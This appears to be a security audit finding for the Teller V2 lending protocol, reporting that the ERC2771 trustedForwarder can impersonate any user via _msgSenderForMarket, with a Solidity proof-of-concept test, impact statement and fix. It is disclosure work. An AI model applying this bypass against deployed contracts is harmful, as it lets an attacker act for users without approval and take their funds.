# The trustedForwarder can execute function in any user context


## Summary

The `_msgSender()` function call in the `_msgSenderForMarket()` function is inherited from the `ERC2771ContextUpgradeable` contract, which allows the `trustedForwarder` address to perform any action on behalf of any users without any approval. This issue occurs when the caller (`trustedForwarder` address) is not the trusted market forwarder.

## Vulnerability Detail

While deploying the TellerV2 contract, the constructor will set `trustedForwarder` address in `TellerV2Context`, which is the `trustedForwarder` of `ERC2771ContextUpgradeable` contract.

Teller protocol use `ERC2771ContextUpgradeable` and implement the `TellerV2Context` on top of it, which is adding approve feature for `trustedForwarder`. When the function that using sender for thier logic, they will call `_msgSenderForMarket()` function. 


If the `trustedForwarder` is set with the difference addres with the trusted market forwarder the `_msgSender()` of `ERC2771ContextUpgradeable` will be return as sender.

The `_msgSender()` function check that the `msg.sender` is `trustedForwarder`, if it `trustedForwarder` then returns last 20 bytes of calldata back, which can be any user address.

The test file below modified from MarketForwarder_Test.sol, set the TellerV2Context constructor address to `trustedForwarder` address.
```solidity
function test_forwarderBypassValidation() public {

    address victimAddress = address(user1);

    address sender = abi.decode(
        marketForwarder.forwardCall(
            abi.encodeWithSelector(
                MarketForwarderTellerV2Mock.getSenderForMarket.selector,
                marketId
            ),
            victimAddress
        ),
        (address)
    );

    (bool approved) = tellerV2Mock.hasApprovedMarketForwarder(
            marketId,
            address(marketForwarder),
            address(victimAddress)
    );

    (bool isTrusted) = tellerV2Mock.isTrustedMarketForwarder(
            marketId,
            address(marketForwarder)
    );
    console.log("marketForwarder Address: ", address(marketForwarder));
    console.log("sender: ", sender);
    console.log("victimAddress: ", victimAddress);
    console.log("Approved: ", approved);
    console.log("isTrusted: ", isTrusted);

    assertEq(sender, victimAddress);
    assertEq(approved, false);
    assertEq(isTrusted, false);
}

contract MarketForwarderUser is User {
    constructor(address _tellerV2) User(_tellerV2) {}
}

contract MarketForwarderTellerV2Mock is TellerV2Context {
    // marketForwarder address
    constructor() TellerV2Context(address(0xa0Cb889707d426A7A386870A03bc70d1b0697598)) {}

    function setMarketRegistry(address _marketRegistry) external {
        marketRegistry = IMarketRegistry(_marketRegistry);
    }

    function getSenderForMarket(uint256 _marketId)
        external
        view
        returns (address)
    {
        return _msgSenderForMarket(_marketId);
    }

    function getDataForMarket(uint256 _marketId)
        external
        view
        returns (bytes calldata)
    {
        return _msgDataForMarket(_marketId);
    }
}
```


## Impact
The `trustedForwarder` address can use call any functions that rely on the `_msgSenderForMarket()` function to execute actions and transactions on behalf of any user. Resulting in loss of user funds. This conflict with the admin role as described in the scope.

## Tool used

Manual Review

## Recommendation
We recommend removing the `ERC2771Context` implementation and using only Context to prevent the set of `trustedForwarder` in the `ERC2771Context`.

This issue can also fixed by change the `trustedForwarder` in TellerV2Context to address 0 by default.
